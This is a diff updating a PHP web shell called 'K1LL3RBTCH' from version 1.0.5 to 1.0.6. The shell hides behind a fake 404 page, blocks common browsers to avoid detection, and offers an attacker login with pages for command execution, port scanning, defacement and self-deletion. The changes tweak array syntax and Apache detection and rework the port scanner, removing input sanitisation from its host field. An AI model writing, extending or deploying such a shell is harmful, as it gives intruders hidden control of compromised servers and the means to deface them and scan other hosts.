@@ -51,7 +51,7 @@ ob_start(); // start cleaning
 $access_key = filter_var("qwerty", FILTER_SANITIZE_STRING); // password (You can set your own)
 
 // array with $_GET pages
-$switch = array('home', 'securityinformation', 'commandline', 'portscan', 'script', 'deface', 'phpinfo', 'suicide', 'logout');
+$switch = ['home', 'securityinformation', 'commandline', 'portscan', 'script', 'deface', 'phpinfo', 'suicide', 'logout'];
 
 // writing class for login system
 class Loginsystem
@@ -62,8 +62,8 @@ class Loginsystem
   {
 
     // lets make a doom list (array) for blocking other browsers.
-    $blockedbrowsers = array('Google', 'Opera', 'Chrome',
-    'Edge', 'Safari', 'Torch', 'Maxthon', 'MSIE');
+    $blockedbrowsers = ['Google', 'Opera', 'Chrome',
+    'Edge', 'Safari', 'Torch', 'Maxthon', 'MSIE'];
 
     // making function for '404' message.
     function message404()
@@ -73,7 +73,7 @@ class Loginsystem
       // make it more realistic and more undetectable.
 
       // checking for apache2
-      if(strpos($_SERVER['SERVER_SOFTWARE'], 'apache') !== false)
+      if(strpos($_SERVER['SERVER_SOFTWARE'], 'Apache/2') !== false)
       {
         // set header
         header('HTTP/1.x 404 Not Found');
@@ -194,7 +194,7 @@ class Loginsystem
     if(!isset($_SESSION['attackersession']))
     {
       // show login form
-      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.5 by It0sh1</title>");
+      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.6 by It0sh1</title>");
       // include favicon
       favicon();
       print("</head><body style='background-color: black;'>");
@@ -204,7 +204,7 @@ class Loginsystem
       print("<br><br>");
 
       // CSS for error message.
-      print("<b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.5 by It0sh1</b>");
+      print("<b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.6 by It0sh1</b>");
       print("<form method='POST' action='' style='color: white;'>");
       print("<br><br><b style='color: white;'>Password:</b>\n<input type='password' id='keyinput' placeholder='Enter your password.' id='id_password' name='key' style='width: 260px; height: 2.60%;border: 2px solid #6C686C; background-color: black; color: white;'>&nbsp;<input type='checkbox' onclick='ShowPassword()'' title='show password'>&nbsp;");
       print("<button type='submit' name='login' style='height: 2.60%; background-color: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer; font-size: 12px;'>login</button><br><br>");
@@ -245,11 +245,11 @@ class Loginsystem
     if(isset($_SESSION['attackersession']))
     {
       // show admin login panel
-      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.5</title>");
+      print("<head><title>".$_SERVER['HTTP_HOST']." | K1LL3RBTCH v1.0.6</title>");
       // insert favicon
       favicon();
       print("</head><body style='background-color: black;'>");
-      print("<code style='color: #FFE6E8; font-size: 14px;'><center><b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.5 - Made by It0sh1</b><hr></center>");
+      print("<code style='color: #FFE6E8; font-size: 14px;'><center><b style='color: #8B0000; font-size: 14px;'>K1LL3RBTCH v1.0.6 - Made by It0sh1</b><hr></center>");
       print("<center style='float: right;'>");
       print("<b style='float: right;'>".self::img()."</b></center>");
       print("<b style='color: #B22222; font-size: 13px;'>System: </b>".PHP_UNAME()."<br>");
@@ -286,7 +286,7 @@ class Loginsystem
       function servinfo()
       {
         // apache2 based
-        if(strpos($_SERVER['SERVER_SOFTWARE'], 'apache') !== false)
+        if(strpos($_SERVER['SERVER_SOFTWARE'], 'Apache/2') !== false)
         {
           print("<b style='color: #B22222; font-size: 13px;'>Apache2 files: </b>".implode(' ,', getenv())."<br>");
         }
@@ -863,7 +863,7 @@ class shellfunctions
       // create function check
       function getenvv()
       {
-        if(strpos($_SERVER['SERVER_SOFTWARE'], 'apache') !== false)
+        if(strpos($_SERVER['SERVER_SOFTWARE'], 'Apache/2') !== false)
         {
           print("<b style='color: #B22222; font-size: 14px;'>Apache2 Files: </b>".implode(' ,', getenv())."<br><br>");
         }
@@ -1447,7 +1447,7 @@ class shellfunctions
       print("<code style='color: #FFE6E8;'>");
       print("<h2 style='color: #8B0000;'>Port Scanner</h2><hr><center>");
       print("<form method='POST' action=''>");
-      print("<br><br><br>Host: <br><input type='text' name='host' value='".$_SERVER['HTTP_HOST']."' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
+      print("<br><br><br>Host: <br><input type='text' name='host' value='".$_SERVER['SERVER_NAME']."' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
       print("<br><br><br>Start port: <br><input type='text' name='startport' value='1' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
       print("<br><br><br>End Port: <br><input type='text' name='endport' value='65535' style='border: 2px solid #6C686C; background-color: black; color: white;'>");
       print("<br><br><br><button type='submit' name='scanbitch' style='background: rgb(0,0,0);color: white; border: 2px solid #6c686C;padding: 2px 13px;border-radius: 3px;cursor: pointer;font-size: 11px;'>scan</button>");
@@ -1480,7 +1480,7 @@ class shellfunctions
         if(isset($_POST['scanbitch']))
         {
           // some variables
-          $host  = strip_tags($_POST['host']);
+          $host  = $_POST['host'];
           $sport = strip_tags($_POST['startport']);
           $eport = strip_tags($_POST['endport']);
 
@@ -1492,7 +1492,7 @@ class shellfunctions
             for($socketport=$sport;$socketport<=$eport; $socketport++)
             {
               // create connection
-              $connecting = @socket_connect($socketconn, $host, $socketport);
+              $connecting = @socket_connect($socketconn, $host, $socketport) or die("Failed to connect: <b style='color: red;'>".socket_strerror(socket_last_error()) . "</b>.<br><br>");
               // check if connection is true and established:
               if($connecting == true)
               {
@@ -1513,41 +1513,41 @@ class shellfunctions
             }
 
           // when socket_create does not exists but fsockopen does
-          } elseif(!function_exists('socket_create') AND function_exists('fsockopen'))
-          {
-            // for loop
-            for($socketport=$sport;$socketport<=$eport;$socketport++)
+          } elseif(!function_exists('socket_create'))
             {
-              // make connection
-              $fsockconn = fsockopen($host, $socketport);
-
-              // check if connection is true:
-              if($fsockconn == true)
+              // for loop
+              for($socketport=$sport;$socketport<=$eport;$socketport++)
               {
-                // create list of showing ports
-                // end PHP TAG ?>
-                <tr><td>Port:</td>
-                <td><?php echo "<a href='http://".$_SERVER['SERVER_ADDR'].":".$socketport."'>".$socketport."</a>"; ?></td>
-                <td style='color: green;'>OPEN &#9989;</td>
+                // make connection
+                $fsockconn = fsockopen($host, $socketport);
 
-              </tr>
-                <?php // OPEN PHP TAG
+                // check if connection is true:
+                if($fsockconn == true)
+                {
+                  // create list of showing ports
+                  // end PHP TAG ?>
+                  <tr><td>Port:</td>
+                    <td><?php echo "<a href='http://".$_SERVER['SERVER_ADDR'].":".$socketport."'>".$socketport."</a>"; ?></td>
+                    <td style='color: green;'>OPEN &#9989;</td>
 
-                // close connection
-                fclose($fsockconn);
+                  </tr>
+                  <?php // OPEN PHP TAG
+
+                  // close connection
+                  fclose($fsockconn);
+                }
               }
             }
+
+            // EXIT SCRIPT
+            exit; // EXIT
           }
-
-          // EXIT SCRIPT
-          exit; // EXIT
         }
-      }
 
-      // declare portscanner
-      PortScanner();
+        // declare portscanner
+        PortScanner();
+      }
     }
-  }
 
   // creating function for scripting
   public static function scripting()
